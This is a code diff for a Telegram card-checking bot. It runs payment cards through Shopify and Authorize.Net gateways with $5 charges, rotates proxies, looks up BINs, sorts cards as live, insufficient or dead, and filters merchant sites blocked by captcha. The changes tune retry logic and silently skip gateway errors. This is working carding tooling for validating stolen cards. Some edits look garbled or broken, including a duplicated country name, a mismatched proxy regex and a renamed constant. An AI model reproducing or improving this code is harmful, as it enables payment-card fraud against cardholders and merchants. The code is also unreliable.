@@ -93,7 +93,7 @@ KEYS_FILE = "redeem_keys.json"
 
 # التعديلات المطلوبة
 WORKERS = 40  
-DELAY = 3.0  
+DELAY = 8  
 HIT_DELAY = 1.0
 API_TIMEOUT = 60
 
@@ -269,7 +269,7 @@ COUNTRY_NAME_TO_CODE = {
     "SAN MARINO": "SM", "SAO TOME AND PRINCIPE": "ST", "SAUDI ARABIA": "SA", "SENEGAL": "SN",
     "SERBIA": "RS", "SEYCHELLES": "SC", "SIERRA LEONE": "SL", "SINGAPORE": "SG", "SLOVAKIA": "SK",
     "SLOVENIA": "SI", "SOLOMON ISLANDS": "SB", "SOMALIA": "SO", "SOUTH AFRICA": "ZA",
-    "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS": "GS", "SPAIN": "ES", "SRI LANKA": "LK",
+    "SOUTH GEORGIA AND THE SOUTH SOUTH SANDWICH ISLANDS": "GS", "SPAIN": "ES", "SRI LANKA": "LK",
     "SUDAN": "SD", "SURINAME": "SR", "SVALBARD AND JAN MAYEN": "SJ", "SWAZILAND": "SZ", "ESWATINI": "SZ",
     "SWEDEN": "SE", "SWITZERLAND": "CH", "SYRIAN ARAB REPUBLIC": "SY", "SYRIA": "SY", "TAIWAN, PROVINCE OF CHINA": "TW",
     "TAIWAN": "TW", "TAJIKISTAN": "TJ", "TANZANIA, UNITED REPUBLIC OF": "TZ", "TANZANIA": "TZ", "THAILAND": "TH",
@@ -491,7 +491,7 @@ def parse_proxy_format(proxy):
         
     if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
     elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
-    elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
+    elif re.match(r'^([^ZQ]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
     else: return None
     if not h or not p: return None
     pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
@@ -532,7 +532,6 @@ async def get_shopify_sites():
     
     return _CACHED_SHOPIFY_SITES
 
-# دالة مطورة لتحديد جميع أنواع أخطاء البوابة أو المواقع
 def is_dead_site_error(err):
     if not err: return True
     e = unsf(str(err)).lower()
@@ -541,9 +540,8 @@ def is_dead_site_error(err):
         'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
         'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
         '504', '502', '503', '429', 'tunnel', 'connection close', 'format error',
-        '404', 'login', 'requires login', '401', 'unauthorized', 'site error', 'forbidden',
-        'login required', 'access denied', 'password protected', 'failed to fetch',
-        'api error', 'api http', 'internal server error', '500'
+        '404', 'login', 'requires login', 'site not supported', 'not shopify', 'site error', '401',
+        'site requires login', 'login required'
     ]
     return any(k in e for k in bad_keywords)
 
@@ -652,6 +650,7 @@ async def get_bin_info(bin_code, session=None):
         "Accept": "application/json"
     }
     
+    # 1. محاولة جلب الـ BIN من موقع Antipublic
     try:
         url1 = f"https://bins.antipublic.cc/bins/{b6}"
         async def fetch1(s):
@@ -676,6 +675,7 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
+    # 2. محاولة جلب الـ BIN من موقع HandyAPI (مع إصلاح خطأ الـ None)
     try:
         url2 = f"https://data.handyapi.com/bin/{b6}"
         async def fetch2(s):
@@ -700,6 +700,7 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
+    # 3. مصدر احتياطي إضافي (Binlist)
     try:
         url3 = f"https://lookup.binlist.net/{b6}"
         async def fetch3(s):
@@ -724,6 +725,7 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
+    # 4. إذا فشلت كل المواقع، ارجع القيمة الافتراضية
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}
 
 # ====================== SHOPIFY GATEWAY ENGINE ======================
@@ -741,6 +743,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         site_encoded = quote(site_param)
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
+        
         req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}&amount=5&amt=5&price=5"
         
         headers = {
@@ -749,11 +752,14 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         
         async with session.get(req_url, headers=headers, timeout=API_TIMEOUT) as resp:
             text_data = await resp.text()
+            
             gt = "Shopify"
             pr = "$5.00"
             rm = ""
             
-            # إرجاع خطأ الموقع صراحة إذا كانت حالة HTTP غير ناجحة (مثل 504، 401، 403، 404)
+            if resp.status in [401, 504, 502, 503, 429]:
+                return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
+            
             if resp.status != 200:
                 return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
@@ -778,7 +784,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             if any(k in clean_rm for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
-            if is_dead_site_error(rm) or any(k in clean_rm for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504', '401', '404', 'login', 'requires login', 'unauthorized']):
+            if is_dead_site_error(rm) or any(k in clean_rm for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504', '401', 'site error', 'not shopify', 'site not supported', 'requires login']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
                 
             if 'insufficient' in clean_rm or 'funds' in clean_rm or 'balance' in clean_rm:
@@ -806,13 +812,14 @@ async def check_authnet_api(card, proxy, session):
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         card = card.strip()
         
-        req_url = f"{AUTHNET_API_URL}?cc={quote(card)}&amount=5&amt=5&price=5"
+        req_url = f"{AUTHNET_URL}?cc={quote(card)}&amount=5&amt=5&price=5"
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         }
         
         async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as resp:
             text_data = await resp.text()
+            
             pr = None
             try:
                 rj = json.loads(text_data)
@@ -843,7 +850,7 @@ async def check_authnet_api(card, proxy, session):
             if any(k in clean_rm for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
-            if any(k in clean_rm for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable', '504', '502', '503', '401', '404', 'login']):
+            if any(k in clean_rm for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable', '504', '401', 'site error']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr, 'retry': True}
                 
             return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
@@ -874,9 +881,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                     last_res = r
                     continue
                 return r
-            # إذا فشلت كل محاولات AuthNet بسبب مشاكل اتصال أو API نرجع تخطي صامت
-            if last_res.get('status') == 'Site Error':
-                return {'status': 'Silent_Skip', 'card': card}
             return last_res
 
         lr = None
@@ -902,10 +906,10 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
                 status = r.get('status')
                 msg = str(r.get('message', '')).lower()
+                
                 clean_msg = unsf(msg).lower()
                 
-                # إذا تطلب الموقع تسجيل دخول أو تسبب بـ 404/401، يتم حظره فوراً برفع عداد أخطائه
-                if any(k in clean_msg for k in ['404', 'login', 'requires login', '401', 'unauthorized', 'password', 'protected']):
+                if any(k in clean_msg for k in ['404', 'login', 'requires login', 'not shopify', 'site not supported']):
                     _SITE_ERRORS_COUNT[s] = _MAX_SITE_ERRORS + 5 
                     lr = r
                     continue 
@@ -916,8 +920,8 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                     lr = r
                     continue
 
-                if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
-                    await asyncio.sleep(random.uniform(0.5, 1.2))
+                if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway', '401']):
+                    await asyncio.sleep(random.uniform(1.0, 1.8))
                     lr = r
                     continue
 
@@ -934,15 +938,10 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 
             lr = r
             
-        # إذا انتهت كل المحاولات وكانت النتيجة الأخيرة هي خطأ موقع، نرجع تخطي صامت تماماً
-        if lr and (lr.get('status') == 'Site Error' or is_dead_site_error(lr.get('message', ''))):
-            return {'status': 'Silent_Skip', 'card': card}
-            
         if lr: return lr
-        return {'status': 'Silent_Skip', 'card': card}
-        
+        return {'status': 'Site Error', 'message': 'Max retries exceeded with site errors', 'card': card}
     except Exception as e:
-        return {'status': 'Silent_Skip', 'card': card}
+        return {'status': 'Site Error', 'message': f'Fatal Retry Error: {str(e)[:40]}', 'card': card}
 
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
@@ -1029,7 +1028,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
 async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global _MAINTENANCE_MODE, _CACHED_SHOOPY_SITES, _LAST_SITES_FETCH
+    global _MAINTENANCE_MODE, _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     if not update.message: return
     uid = update.effective_user.id
     USER_LAST_REQ[uid] = time.time()
@@ -1379,7 +1378,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 target_url = f"https://{site_url}/cart.json"
                 try:
                     async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
-                        if resp.status in [403, 429, 430, 502, 503, 504]:
+                        if resp.status in [403, 429, 430, 502, 503, 504, 401]:
                             captcha_count += 1
                             return
                         if resp.status in [200, 301, 302, 404]:
@@ -1404,7 +1403,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             res_msg = f"""<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>
             
 ├ <b>{sf('Total Loaded')}:</b> <code>{sf(str(len(raw_sites)))}</code>
-├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(len(working_sites)))}</code>
+├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(working_sites))}</code>
 ├ <b>{CE_SHIELD} {sf('Captcha/CF Blocked')}:</b> <code>{sf(str(captcha_count))}</code>
 ╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{sf(str(dead_count))}</code>
 
@@ -1578,10 +1577,10 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     c_el = time.time() - c_st
                     status = res.get('status', 'Dead')
                     
-                    # تعديل: إذا كانت نتيجة الفحص تخطي صامت (بسبب أخطاء المواقع المتكررة)
-                    if status == 'Silent_Skip':
-                        chk += 1  # نزيد العداد العام ليكتمل الفحص بدون تعليق
-                        continue  # نتجاهل العملية تماماً بصمت (بدون زيادة الأخطاء وبدون تعديل آخر استجابة)
+                    # نظام التجاهل التام والصامت لأخطاء البوابات (Site Error)
+                    if status == 'Site Error':
+                        chk += 1  # يتم احتسابه في شريط التحميل الكلي لضمان اكتمال فحص الملف بدون تعليق
+                        continue  # تجاوز صامت تماماً بدون تحديث الـ Responses ولا زيادة عداد الأخطاء
                         
                     chk += 1
                     raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
@@ -1594,14 +1593,11 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                         app += 1
                     elif status == 'Insufficient': 
                         ins += 1
-                    elif status == 'Site Error': 
-                        err += 1
                     else: 
                         dec += 1
                 except asyncio.CancelledError: break
                 except Exception: 
-                    err += 1
-                    chk += 1
+                    chk += 1  # تجنب اللانهائية عند حدوث خطأ غير متوقع
                 finally:
                     queue.task_done()
             if not is_stopped(): 
